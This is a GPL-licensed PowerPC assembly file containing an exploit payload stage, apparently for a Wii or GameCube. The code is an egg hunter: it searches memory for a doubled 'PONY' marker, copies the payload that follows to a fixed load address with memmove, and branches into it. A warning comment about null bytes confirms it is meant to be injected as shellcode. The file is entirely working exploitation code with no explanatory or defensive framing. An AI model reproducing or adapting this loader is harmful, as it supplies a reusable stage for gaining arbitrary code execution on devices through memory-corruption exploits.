#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.

.set r0, 0
.set r1, 1
.set r2, 2
.set r3, 3
.set r4, 4
.set r5, 5
.set r6, 6
.set r7, 7
.set r8, 8
.set r9, 9
.set r10, 10
.set r11, 11
.set r12, 12
.set r13, 13
.set r14, 14
.set r15, 15
.set r16, 16
.set r17, 17
.set r18, 18
.set r19, 19
.set r20, 20
.set r21, 21
.set r22, 22
.set r23, 23
.set r24, 24
.set r25, 25
.set r26, 26
.set r27, 27
.set r28, 28
.set r29, 29
.set r30, 30
.set r31, 31

# WARNING: This payload can't contain two null bytes in the same word.
# Individual null bytes and null bytes in different words are fine.
.set memmove, 0x800874f4
.set egg, 0x504f4e59 #PONY
.set loadaddress, 0x80090004 # Should be after memmove so we don't clobber it in the copy
.set payloadLength, 0x00010004 # Should be good enough

_start:

  # Set up a stack frame.
	lis r1, 0x8080 ; lis r0, 4 ; subi r0, r0, 4 ; stwu r0, -64(r1)

  # Load egg to search for.
  lis r3, egg@h ; ori r3, r3, egg@l

  # Load address to start searching at.
  lis r4, 0x937f ; ori r4, r4, 0xfffc

loop_start:
  # Find the egg twice in a row in memory ie. PONYPONYpayload
  subi r4, r4, 0x0004
  lwz r5, -0x0008(r4)
  cmplw r5, r3
  bne loop_start
  lwz r5, -0x0004(r4)
  cmplw r5, r3
  bne loop_start

  lwz r30, 4(r4) # Embedded payload length
  addi r4, r4, 4
  lwz r29, -4(r4) # Offset to embedded payload
  subi r4, r4, 4
  add r29, r4, r29 # Calculate address of payload in memory
  addi r4, r4, 8

  lis r3, loadaddress@h ; ori r3, r3, loadaddress@l
  lis r5, payloadLength@h ; ori r5, r5, payloadLength@l
  lis r6, memmove@h ; ori r6, r6, memmove@l
  mr r31, r3 # Save r3 before call.
  mtctr r6
  bctrl # Call memmove to copy payload.

  mtlr r31
  blr

